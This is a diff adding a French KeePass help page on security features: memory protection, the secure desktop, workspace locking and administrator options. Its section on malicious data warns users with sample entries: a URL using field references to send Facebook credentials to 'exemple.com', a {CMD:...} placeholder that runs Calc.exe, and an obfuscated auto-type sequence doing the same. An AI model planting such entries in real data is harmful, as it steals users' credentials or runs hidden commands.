+<h2 class="rvps13"><a name="secmemprot"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_file_locked%207.png"><span class="rvts0"><span class="rvts24"> La protection de la mémoire du processus</span></span></h2>
+<p class="rvps7"><span class="rvts8">Pendant l'exécution de KeePass, les données sensibles sont stockées de manières chiffrées dans la mémoire du processus. Cela signifie que même si vous vidiez la mémoire du processus KeePass sur le disque, vous ne pourriez trouver aucune donnée sensible. Pour des raisons de performance, la protection de la mémoire du processus s'applique uniquement aux données sensibles&nbsp;; les données sensibles incluent ici, par exemple, la clé principale et les mots de passe des entrées, mais pas les noms d'utilisateur, les remarques et les pièces jointes. Remarquez que cela n'a rien à voir avec le </span><a class="rvts14" href="Lasecurite.html#secencrypt">chiffrement des fichiers de base de données</a><span class="rvts8">&nbsp;; dans les fichiers de base de données, toutes les données (y compris les noms d'utilisateur, etc.) sont chiffrées.</span></p>
+<p class="rvps7"><span class="rvts8">De plus, KeePass efface toute la mémoire critique pour la sécurité (si possible) quand elle n'est plus nécessaire, c'est-à-dire qu'il écrase ces zones de mémoire avant de les libérer.</span></p>
+<p class="rvps7"><span class="rvts8">KeePass utilise Windows DPAPI pour chiffrer des données sensibles en mémoire (via </span><a class="rvts14" href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory">CryptProtectMemory</a><span class="rvts8"> / </span><a class="rvts14" href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.protectedmemory">ProtectedMemory</a><span class="rvts8">). Avec DPAPI, la clé pour le chiffrement de la mémoire est stockée dans une zone de mémoire sécurisée, non permutable gérée par Windows. DPAPI est disponible sur Windows 2000 et supérieur. KeePass 2.x utilise toujours DPAPI s'il est disponible&nbsp;; dans KeePass 1.x, il peut être désactivé (dans les options avancées&nbsp;; l'utilisation de DPAPI est activé par défaut).Si DPAPI n'est pas disponible ou est désactivé, alors KeePass se contente de chiffrer le processus mémoire en utilisant ChaCha20 avec une clé aléatoire&nbsp;; notez que c'est moins sécurisé que DPAPI, car la clé est également stockée dans la mémoire de processus échangeable. Sur les systèmes Unix-like, KeePass 2.x utilise ChaCha20, car Mono ne fournit aucune méthode efficace de protection de la mémoire.</span></p>
+<p class="rvps7"><span class="rvts8">Pour certaines opérations, KeePass doit mettre les données sensibles à disposition de manières déchiffrées dans la mémoire du processus. Par exemple, pour afficher un mot de passe dans le contrôle d'affichage de liste standard fourni par Windows, KeePass doit fournir le contenu de la cellule (le mot de passe) sous forme de chaîne non chiffrée (sauf si le masquage à l'aide d'astérisques est activé). Les opérations qui aboutissent à des données déchiffrées dans la mémoire de processus incluent, sans toutefois s'y limiter&nbsp;: l'affichage de données (pas d'astérisque) dans les contrôles standards, le transfert de données vers/depuis d'autres applications (via le presse-papiers, glisser&amp;déposer, Entrée standard/Sortie standard, etc.), le remplacement des paramètres substituables (c'est-à-dire lors de la saisie automatique, la recherche de données (c'est-à-dire les commandes dans le menu 'Rechercher' qui implique des données sensibles, l'importation/exportation de fichiers (sauf KDBX) et le chargement/enregistrement de fichiers non chiffrés. Windows et .NET peuvent créer des copies des données (dans la mémoire du processus) qui ne peuvent pas être effacées par KeePass.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secdesktop"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_kgpg%201.png"><span class="rvts0"><span class="rvts24"> La saisie de la clé principale sur un bureau sécurisé (protection contre les enregistreurs de frappe)</span></span></h2>
+<p class="rvps7"><span class="rvts8">KeePass 2.x possède une option (dans 'Outils' → 'Options...' → onglet 'Sécurité') pour afficher des boîtes de dialogue de clé principale sur un bureau différent/sécurisé (pris en charge sous Windows 2000 et supérieur), similaire au contrôle de compte utilisateur de Windows (UAC). Presque aucun enregistreur de frappe ne fonctionne sur un bureau sécurisé.</span></p>
+<p class="rvps7"><span class="rvts8">L'option est désactivée par défaut pour des raisons de compatibilité.</span></p>
+<p class="rvps7"><span class="rvts8">Vous trouverez plus d'informations sur la page d'aide du </span><a class="rvts14" href="https://keepass.info/help/kb/sec_desk.html">bureau sécurisé</a><span class="rvts8">.</span></p>
+<p class="rvps3"><span class="rvts8">Remarquez que la saisie automatique peut également être sécurisée contre les enregistreurs de frappe à l'aide de </span><a class="rvts14" href="../v2/autotype_obfuscation.html">l'obfuscation à deux canaux</a><span class="rvts8">.</span></p>
+<p class="rvps7"><span class="rvts17">Remarque&nbsp;: KeePass a été l'un des premiers gestionnaires de mots de passe permettant d'entrer la clé principale sur un bureau différent/sécurisé&nbsp;!</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="seclocking"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_file_locked%206.png"><span class="rvts0"><span class="rvts24"> Le verrouillage de l'espace de travail</span></span></h2>
+<p class="rvps7"><span class="rvts8">Lors du verrouillage de l'espace de travail, KeePass ferme le fichier de la base de données et ne mémorise que son chemin et certains paramètres d'affichage.</span></p>
+<p class="rvps7"><span class="rvts8">Cela offre une sécurité maximale&nbsp;: déverrouiller l'espace de travail est aussi difficile que l'ouverture normale du fichier de la base de données. En outre, cela évite la perte de données (l'ordinateur peut se bloquer lorsque KeePass est verrouillé, sans endommager la base de données).</span></p>
+<p class="rvps7"><span class="rvts8">Lorsqu'une sous-boîte de dialogue est ouverte, l'espace de travail peut ne pas être verrouillé&nbsp;; pour plus de détails, cf. la </span><a class="rvts14" href="LaFAQtechnique.html#noautolock">FAQ</a><span class="rvts8">.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secattach"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_desktop.png"><span class="rvts0"><span class="rvts24"> Affichage/Édition de pièces jointes</span></span></h2>
+<p class="rvps7"><span class="rvts8">KeePass 2.x possède un afficheur/éditeur interne pour les pièces jointes. Pour plus d'informations sur son utilisation pour travailler avec des textes, reportez-vous à la section '</span><a class="rvts14" href="LaFAQtechnique.html#rtftext">Comment stocker et travailler avec de grandes quantités de texte (formaté)&nbsp;?</a><span class="rvts8"> '.</span></p>
+<p class="rvps7"><span class="rvts8">L'afficheur/éditeur interne travaille avec les données dans la mémoire principale. Il n'extrait/ne stocke pas les données sur le disque.</span></p>
+<p class="rvps7"><span class="rvts8">Lorsque vous essayez d'ouvrir une pièce jointe que l'afficheur/éditeur interne ne peut pas manipuler (par exemple&nbsp;: un fichier PDF), KeePass extrait la pièce jointe dans un fichier temporaire (chiffré en EFS) et l'ouvre à l'aide de l'application par défaut associée à ce type de fichier. Une fois l'afficheur/édition terminé, l'utilisateur peut choisir d'importer ou annuler toute modification apportée au fichier temporaire. Dans tous les cas, KeePass efface ensuite en toute sécurité le fichier temporaire (y compris l'écrase).</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secplugins"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_blockdevice%202.png"><span class="rvts0"><span class="rvts24"> Les greffons (plug-in)</span></span></h2>
+<p class="rvps7"><span class="rvts8">Une page distincte existe sur&nbsp;: </span><a class="rvts14" href="../v2/plugins.html">la sécurité des greffons</a><span class="rvts8">.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secselftests"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_kblackbox.png"><span class="rvts0"><span class="rvts24"> Les autotests</span></span></h2>
+<p class="rvps7"><span class="rvts8">À chaque fois que vous démarrez KeePass, le programme effectue un rapide autotest pour vérifier si les algorithmes de chiffrement et de hachage fonctionnent correctement et passent leurs vecteurs de test. Si l'un des algorithmes ne réussit pas ses vecteurs de test, alors KeePass affiche une boîte de dialogue d'exception de sécurité.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secspecattacks"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_openterm%203.png"><span class="rvts0"><span class="rvts24"> Les logiciels espions spécialisés</span></span></h2>
+<p class="rvps7"><span class="rvts8">Cette section donne des réponses aux questions suivantes&nbsp;:</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><span class="rvts8">Est-ce que le chiffrement du fichier de configuration renforcerait-il la sécurité en empêchant des modifications par un programme malveillant&nbsp;?</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">Est-ce que le chiffrement de l'application (fichier exécutable, éventuellement associé au fichier de configuration) renforcerait-il la sécurité en empêchant toute modification par un programme malveillant&nbsp;?</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">Est-ce qu'une option permettant d'empêcher le chargement de greffons renforcerait-elle la sécurité&nbsp;?</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">Est-ce que l'enregistrement des options de sécurité dans la base de données (pour remplacer les paramètres de l'instance KeePass) renforcerait-il la sécurité&nbsp;?</span></li>
+ <li class="rvps14 noindent"><span class="rvts8">Est-ce que verrouiller la fenêtre principale de sorte que seule la saisie automatique soit autorisée renforcerait-il la sécurité&nbsp;?</span></li>
+</ul>
+<p class="rvps7"><span class="rvts8">La réponse à toutes ces questions est&nbsp;: non. L'ajout de l'une de ces fonctionnalités ne renforcerait pas la sécurité.</span></p>
+<p class="rvps7"><span class="rvts8">Toutes les fonctionnalités de sécurité de KeePass protègent contre les menaces </span><span class="rvts16">génériques</span><span class="rvts8"> comme les enregistreurs de frappe, les moniteurs de presse-papiers, les moniteurs de contrôle de mot de passe, etc. (et contre les attaques hors exécution sur la base de données, analyseurs de dump mémoire, etc.). Cependant, dans toutes les questions ci-dessus, nous supposons qu'un programme-espion malveillant est en cours d'exécution sur le système et qu'il est spécialisé dans l'attaque de KeePass.</span></p>
+<p class="rvps7"><span class="rvts8">Dans cette situation, les meilleures fonctionnalités de sécurité échoueront. Il s'agit de la loi n°&nbsp;1 des </span><a class="rvts14" href="https://web.archive.org/web/20180529154650/https://technet.microsoft.com/en-us/library/hh278941.aspx">dix lois immuables de la sécurité</a><span class="rvts8"> (article de Microsoft TechNet&nbsp;; cf. l'article de Microsoft TechNet </span><a class="rvts14" href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc895640(v=msdn.10)">revoir les 10 lois immuables de la sécurité, première partie</a><span class="rvts8">)&nbsp;:</span><br/><span class="rvts17">"Si un méchant type peut vous persuader de lancer son programme sur votre ordinateur, ce n'est plus votre ordinateur"</span><span class="rvts8">.</span></p>
+<p class="rvps7"><span class="rvts8">Par exemple, considérons le logiciel espion très simple suivant, spécialisé pour KeePass&nbsp;: une application qui attend le démarrage de KeePass, puis masque l'application démarrée et imite KeePass lui-même. Toutes les interactions (telle que la saisie d'un mot de passe pour déchiffrer la configuration, etc.) peuvent être simulées. La seule façon de découvrir ce logiciel espion consiste à utiliser un programme qu'il ignore ou ne peut pas manipuler (bureau sécurisé)&nbsp;; dans tous les cas, il ne peut s'agir de KeePass.</span></p>
+<p class="rvps7"><span class="rvts8">Pour protéger votre PC, nous vous recommandons d'utiliser un logiciel antivirus. D'utiliser un pare-feu approprié, exécutez le logiciel uniquement à partir de sources fiables, n'ouvrez pas les pièces jointes inconnues, etc.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secmaldata"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_enhanced_browsing%201.png"><span class="rvts0"><span class="rvts24"> Les données malveillantes</span></span></h2>
+<p class="rvps7"><span class="rvts8">L'utilisateur devrait vérifier toutes les données qu'il saisit et/ou exécute.</span></p>
+<p class="rvps7"><span class="rvts8">Si vous saisissez/exécutez des données sans d'abord les vérifier, cela peut amener à de sérieux problèmes de sécurité (comme la divulgation de données sensibles ou une exécution de code malveillant). Il s'agit d'un principe général&nbsp;; il s'applique à la plupart des applications, pas seulement à KeePass.</span></p>
+<p class="rvps7"><span class="rvts8">Exemples&nbsp;:</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><span class="rvts8">Le </span><a class="rvts14" href="LechampdadresseURL.html">champ Adresse (URL)</a><span class="rvts8"> d'une entrée prend en charge l'exécution d'une </span><a class="rvts14" href="LechampdadresseURL.html#cmdln">ligne de commande</a><span class="rvts8">. Donc, si vous (saisissez et) exécutez une adresse (URL) sans d'abord la vérifier, alors vous pourriez exécuter un programme/code malveillant.</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">En exécutant une adresse (URL), une malveillante </span><a class="rvts14" href="LechampdadresseURL.html#override">adresse (URL) remplacée</a><span class="rvts8"> (globale ou spécifique à l'entrée) peut être exécutée à la place, si vous ne la vérifiez pas.</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">KeePass prend en charge </span><a class="rvts14" href="Lesparametressubstituables.html">les paramètres substituables (placeholders)</a><span class="rvts8">. Tous les paramètres substituables réguliers sont sous la forme '</span><span class="rvts23">{...}</span><span class="rvts8">', et </span><a class="rvts14" href="Lesparametressubstituables.html#envvars">les variables d'environnement</a><span class="rvts8"> sont sous la forme '</span><span class="rvts23">%...%</span><span class="rvts8">'. Toutes les données devraient être vérifiées pour des paramètres substituables et des variables d'environnement malveillants.</span></li>
+ <ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: circle;">
+  <li class="rvps11 noindent"><a class="rvts14" href="Lesreferencesdechamp.html">Les références de champ</a><span class="rvts8"> peuvent insérer les données d'autres entrées dans la donnée courante. Par exemple&nbsp;: si vous avez un compte Facebook, saisir et exécuter l'adresse (URL) suivante pourrait envoyer votre nom d'utilisateur et mot de passe Facebook au serveur 'exemple.com'&nbsp;:</span><br/><span class="rvts23">https://exemple.com/?u={REF:U@T:Facebook}&amp;p={REF:P@T:Facebook}</span></li>
+  <li class="rvps11 noindent"><span class="rvts8">Le </span><a class="rvts14" href="Lesparametressubstituables.html#cmd">paramètre substituable</a><span class="rvts8"> </span><a class="rvts32" href="Lesparametressubstituables.html#cmd">{CMD:...}</a><span class="rvts8"> exécute une ligne de commande. Par exemple, l'adresse (URL) suivante ouvre 'https://exemple.com/' et exécute 'Calc.exe'&nbsp;:</span><br/><span class="rvts23">https://exemple.com/{CMD:/Calc.exe/W=0/}</span></li>
+ </ul>
+</ul>
+<p class="rvps10"><a class="rvts14" href="Lesparametressubstituables.html#texttrf">Les paramètres substituables de transformation de texte&nbsp;</a><span class="rvts8"> peuvent être utilisés pour obfusquer des parties des données.</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><span class="rvts8">La séquence </span><a class="rvts14" href="Lasaisieautomatique.html">de saisie automatique</a><span class="rvts8"> suivante accomplit une connexion à un login (ouverture de session) et exécute en outre 'Calc.exe'&nbsp;:</span><br/><span class="rvts23">{USERNAME}{TAB}{PASSWORD}{ENTER}{VKEY 91}{T-CONV:/%43%61%6C%63%2E%65%78%65/Uri-Dec/}{VKEY 13}</span><br/><span class="rvts8">Cette séquence ne fonctionne typiquement que sur un système Windows, mais des séquences similaires peuvent être construites pour d'autres systèmes d'exploitation (comme Linux et MacOS).</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">Si vous spécifiez des paramètres de </span><a class="rvts14" href="Lasecurite.html#secdictprotect">transformation de clé</a><span class="rvts8"> faibles suggérés par un attaquant, cela pourrait être plus facile pour l'attaquant de déchiffrer/ouvrir votre base de données.</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">Si vous saisissez/utilisez un profil </span><a class="rvts14" href="Legenerateurdemotdepasse.html">du générateur de mot de passe</a><span class="rvts8"> (suggéré par un attaquant) qui autorise seulement des mots de passe faibles, alors les comptes utilisant de tels mots de passe peuvent ne pas être bien protégés.</span></li>
+ <li class="rvps10 noindent"><span class="rvts8">En utilisant la fonctionnalité </span><a class="rvts14" href="https://keepass.info/help/v2/xml_replace.html">de remplacement XML</a><span class="rvts8"> avec des paramètres malveillants peut induire à une modification malveillante des données de votre base de données.</span></li>
+ <li class="rvps14 noindent"><span class="rvts8">Copier/saisir des </span><a class="rvts14" href="https://keepass.info/help/v2/triggers.html">déclencheurs</a><span class="rvts8"> malveillants dans la boîte de dialogue sans vérifier qu'ils peuvent induire des problèmes de sécurité.</span></li>
+</ul>
+<p class="rvps7"><span class="rvts8">Si l'utilisateur vérifie que les données qu'il entre/exécute, aucune des "attaques" ci-dessus fonctionne. Saisir des données est une opération manuelle (c'est-à-dire qu'un attaquant ne peut pas le faire lui-même), et seulement l'utilisateur peut décider si les effets produits sont prévus ou non. Afficher des boîtes de dialogue d'avertissement/confirmation tout le temps ne serait pas raisonnable.</span></p>
+<p class="rvps7"><span class="rvts8">Quand on ouvre une base de données qui a été créée/modifiée par quelqu'un d'autre, vous devriez vérifier avec attention toutes les données que vous souhaitez utiliser. Si vous ne faites pas entièrement confiance au créateur de la base de données, alors n'ouvrez pas une pièce jointe d'une entrée.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secoptex"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_file_locked%205.png"><span class="rvts0"><span class="rvts24"> Les options pour les experts</span></span></h2>
+<p class="rvps7"><span class="rvts8">La plupart des options de sécurité peuvent être configurées dans la boîte de dialogue des options de KeePass (menu 'Outils' → 'Options...') et dans la boîte de dialogue des paramètres de la base de données (menu 'Fichier' → 'Paramètres de la base de données...').</span></p>
+<p class="rvps7"><span class="rvts8">Cependant, dans KeePass 2.x, il existe en outre quelques options de sécurité pour les experts qui ne peuvent pas être configurées dans l'interface utilisateur. Par exemple, KeePass peut protéger son processus avec une liste de contrôle d'accès discrétionnaire (DACL).</span></p>
+<p class="rvps7"><img alt="Warning" style="width : 13px; height : 13px; vertical-align: middle;" src="lib/imagesb16x16_warning%203.png"><span class="rvts8"> L'activation de ces options pour les experts peut entraîner des problèmes de compatibilité et rendre KeePass inutilisable. Par conséquent, ces options ne peuvent être activées qu'en éditant le fichier de configuration manuellement (à l'aide d'un éditeur XML ou de texte). Cela garantit que les utilisateurs savent comment ils peuvent désactiver les options problématiques (en éditant à nouveau le fichier de configuration) afin de rendre KeePass utilisable à nouveau.</span></p>
+<p class="rvps7"><span class="rvts8">Si vous savez comment fonctionne le système de </span><a class="rvts14" href="Laconfiguration.html">configuration</a><span class="rvts8"> de KeePass, alors consultez la page d'aide </span><a class="rvts14" href="https://keepass.info/help/v2_dev/customize.html#opt">personnalisation</a><span class="rvts8">, sur laquelle ces options sont documentées.</span></p>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secoptadm"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_file_locked%204.png"><span class="rvts0"><span class="rvts24"> Les options pour les administrateurs</span></span></h2>
+<p class="rvps7"><span class="rvts8">Les administrateurs peuvent imposer certains paramètres, interdire certaines fonctions, spécifier des exigences pour les mots de passe maîtres, et bien plus encore. Vous trouverez des détails sur les pages d'aide suivantes&nbsp;:</span></p>
+<ul style="text-indent: 0px; padding: 0; margin: 0 0 0 40px; list-style-position: outside; list-style-type: disc;">
+ <li class="rvps10 noindent"><a class="rvts14" href="Laconfiguration.html">Configuration</a><span class="rvts8">.</span></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="https://keepass.info/help/kb/config_enf.html">Configuration imposée</a><span class="rvts8">.</span></li>
+ <li class="rvps10 noindent"><a class="rvts14" href="../v2_dev/customize.html">Personnalisation (KeePass 2.x)</a><span class="rvts8">, </span><a class="rvts14" href="https://keepass.info/help/v1_dev/customize.html">Personnalisation (KeePass 1.x)</a><span class="rvts8">.</span></li>
+ <li class="rvps14 noindent"><a class="rvts14" href="../v2/policy.html">La stratégie de l'application (KeePass 2.x)</a><span class="rvts8">.</span></li>
+</ul>
+<p class="rvps3"><span class="rvts8"><br/></span></p>
+<h2 class="rvps13"><a name="secissues"></a><img alt="" style="vertical-align: middle; margin : 0px 1px;" src="lib/imagesb16x16_message%201.png"><span class="rvts0"><span class="rvts24"> Les problèmes de sécurité</span></span></h2>
+<p class="rvps7"><span class="rvts8">Pour obtenir une liste des problèmes de sécurité, leur statut et leurs clarifications, veuillez vous reporter à la page </span><a class="rvts14" href="https://keepass.info/help/kb/sec_issues.html">problèmes de sécurité</a><span class="rvts8">.</span><span class="rvts8"></span></p>
+
+            </div>
+            
+            <div id="topic_footer"><div id="topic_footer_content">Copyright &copy; 2003-2025 par Ronan Plantec &amp; Dominik Reichl.</div></div>
+        </div>  <!-- /#topic-content -->
+    </article>
+
+    <footer></footer>
+
+  </div>  <!-- /#main -->
+
+  <div class="mask" data-toggle="sm-nav-expanded"></div>
+  
+  <!-- Modal -->
+  <div class="modal fade" id="hndModal" tabindex="-1" role="dialog" aria-labelledby="hndModalLabel">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+          <h4 class="modal-title" id="hndModalLabel"></h4>
+        </div>
+        <div class="modal-body">
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-primary modal-btn-close" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Splitter -->
+  <div id="hnd-splitter" style="left: 350px"></div>  
+
+  <!-- Scripts -->
+  <script src="vendors/jquery-3.7.1/jquery.min.js"></script>
+  <script src="vendors/bootstrap-3.4.1/js/bootstrap.min.js"></script>
+  <script src="vendors/bootstrap-3.4.1/js/ie10-viewport-bug-workaround.js"></script>
+  <script src="vendors/markjs-8.11.1/jquery.mark.min.js"></script>
+  <script src="vendors/uri-1.19.11/uri.min.js"></script>
+  <script src="vendors/imageMapResizer-1.0.10/imageMapResizer.min.js"></script>
+  <script src="vendors/headroom-0.11.0/headroom.min.js"></script>
+  <script src="vendors/jstree-3.3.10/jstree.min.js"></script>  
+  <script src="vendors/interactjs-1.9.22/interact.min.js"></script>  
+
+  <!-- HelpNDoc scripts -->
+  <script src="js/polyfill.object.min.js"></script>
+  <script src="_translations.js"></script>
+  <script src="js/hndsd.min.js"></script>
+  <script src="js/hndse.min.js"></script>
+  <script src="js/app.min.js"></script>
+
+  <!-- Init script -->
+  <script src="_topic_init.js"></script>
+
+
+
+</body>
+
+</html>
+
